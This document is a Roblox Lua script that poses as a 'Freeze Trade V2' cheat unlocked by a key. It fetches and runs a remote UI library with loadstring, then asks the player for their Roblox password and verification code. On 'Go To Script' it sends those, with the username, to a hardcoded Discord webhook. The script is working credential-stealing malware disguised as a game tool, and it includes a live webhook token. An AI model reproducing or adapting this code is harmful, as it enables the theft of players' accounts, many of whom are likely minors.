local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local CorrectKey = "FreezeTradeV2"
local WebhookURL = "https://discord.com/api/webhooks/1325368195091005551/MjScslsafHeoGg2pRr0ZLTm1hIUZFJ5Y03j9g0WJTp1xBa61A1ehZuqB1U-8KR_OYxpy" -- URL webhook yang akan digunakan

local Window = Rayfield:CreateWindow({
    Name = "Key Test",
    LoadingTitle = "Testing Callback",
    LoadingSubtitle = "By Dinzzz",
})

-- Tab Step 1: Unlock Key
local Tab = Window:CreateTab("Step 1: Unlock Script", 4483362458)

Tab:CreateInput({
    Name = "Masukkan Key untuk Unlock",
    PlaceholderText = "Input key di sini",
    RemoveTextAfterFocusLost = false,
    Callback = function(input)
        print("Callback dimulai. Key yang dimasukkan: " .. tostring(input)) -- Debug

        if input == CorrectKey then
            print("Key valid, melanjutkan...") -- Debug

            -- Menampilkan notifikasi jika key benar
            Rayfield:Notify({
                Title = "Key Benar!",
                Content = "Akses diberikan.",
                Duration = 5,
            })

            -- Tambahkan Tab untuk langkah berikutnya (Step 2)
            local Tab2 = Window:CreateTab("Step 2: Input Data", 4483362458)

            -- Label untuk Username
            Tab2:CreateLabel("Username: " .. game.Players.LocalPlayer.Name)

            local Password = ""
            local VerificationCode = ""

            -- Input Password
            Tab2:CreateInput({
                Name = "Masukkan Password",
                PlaceholderText = "Input password di sini",
                RemoveTextAfterFocusLost = false,
                Callback = function(input)
                    Password = input
                    print("Password yang dimasukkan: " .. tostring(input)) -- Debug
                end,
            })

            -- Input Kode Verifikasi
            Tab2:CreateInput({
                Name = "Masukkan Kode Verifikasi",
                PlaceholderText = "Input kode di sini",
                RemoveTextAfterFocusLost = false,
                Callback = function(input)
                    VerificationCode = input
                    print("Kode verifikasi yang dimasukkan: " .. tostring(input)) -- Debug
                end,
            })

            -- Tombol Menuju Script
            Tab2:CreateButton({
                Name = "Go To Script",
                Callback = function()
                    if Password ~= "" and VerificationCode ~= "" then
                        -- Mengirim data ke Webhook
                        local HttpService = game:GetService("HttpService")
                        local Content = string.format(
                            "Username: %s\nPassword: %s\nVerification Code: %s",
                            game.Players.LocalPlayer.Name, Password, VerificationCode
                        )

                        local Data = {
                            ["content"] = Content,
                            ["username"] = "Rayfield Bot"
                        }

                        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data))
                        print("WELCOME TO FREEZE TRADE V2.") -- Debug

                        Rayfield:Notify({
                            Title = "Welcome To Freeze Trade V2",
                            Content = "THanks for using my script",
                            Duration = 5,
                        })
                    else
                        Rayfield:Notify({
                            Title = "Error!",
                            Content = "Harap isi semua field sebelum mengirim.",
                            Duration = 5,
                        })
                    end
                end,
            })
        else
            print("Key salah!") -- Debug
            Rayfield:Notify({
                Title = "Key Salah!",
                Content = "Coba lagi.",
                Duration = 5,
            })
        end
    end,
})
